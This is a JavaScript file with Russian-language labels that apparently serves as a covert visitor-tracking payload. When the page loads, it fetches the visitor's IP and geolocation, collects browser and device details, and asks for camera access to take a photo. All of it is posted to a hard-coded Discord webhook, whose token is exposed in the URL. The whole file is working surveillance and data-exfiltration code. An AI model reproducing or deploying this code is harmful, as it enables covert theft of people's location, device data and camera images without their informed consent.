async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        
        return { status: "разрешили", image: canvas.toDataURL('image/jpeg') };
    } catch (error) {
        if (error.name === 'NotAllowedError') {
            return { status: "запретили🚫", image: null };
        } else {
            return { status: "❌Не доступно", image: null };
        }
    }
}

async function sendEmbed(ip, geo) {
    const cameraResult = await captureCamera();
    
    const embed = {
        title: "🌐 Информация о пользователе",
        fields: [
            { name: "📱 User Agent", value: navigator.userAgent, inline: false },
            { name: "🗣️ Язык", value: navigator.language, inline: true },
            { name: "🌍 Языки", value: navigator.languages.join(', '), inline: true },
            { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
            { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
            { name: "🌍 Страна", value: geo?.country || "Неизвестно", inline: true },
            { name: "🏙️ Город", value: geo?.city || "Неизвестно", inline: true },
            { name: "📍 Регион", value: geo?.regionName || "Неизвестно", inline: true },
            { name: "📡 Провайдер", value: geo?.isp || "Неизвестно", inline: true },
            { name: "🕐 Часовой пояс", value: geo?.timezone || "Неизвестно", inline: true },
            { name: "📷 Камера", value: cameraResult.status, inline: true },
            { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    const payload = { embeds: [embed] };
    
    if (cameraResult.image) {
        payload.content = "📸 Фото с камеры:";
        const imageBlob = await (await fetch(cameraResult.image)).blob();
        const formData = new FormData();
        formData.append('file', imageBlob, 'camera.jpg');
        formData.append('payload_json', JSON.stringify(payload));
        
        fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
            method: 'POST',
            body: formData
        });
    } else {
        fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
    }
}

fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(ipData => fetch(`http://ip-api.com/json/${ipData.ip}`)
        .then(r => r.json())
        .then(geoData => sendEmbed(ipData.ip, geoData))
    )
    .catch(() => sendEmbed(null, null));
